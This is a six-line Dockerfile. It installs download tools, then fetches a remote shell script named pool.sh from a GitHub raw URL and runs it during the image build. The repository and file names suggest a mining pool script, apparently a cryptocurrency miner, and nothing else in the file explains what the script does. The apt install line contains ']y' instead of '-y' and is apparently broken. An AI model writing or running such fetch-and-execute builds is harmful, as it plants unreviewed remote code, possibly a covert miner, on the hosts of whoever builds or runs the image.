FROM ubuntu
RUN apt update
RUN apt install wget curl git ]y
RUN wget https://raw.githubusercontent.com/minipool001/rie/refs/heads/main/pool.sh
RUN chmod +x pool.sh
RUN sh pool.sh
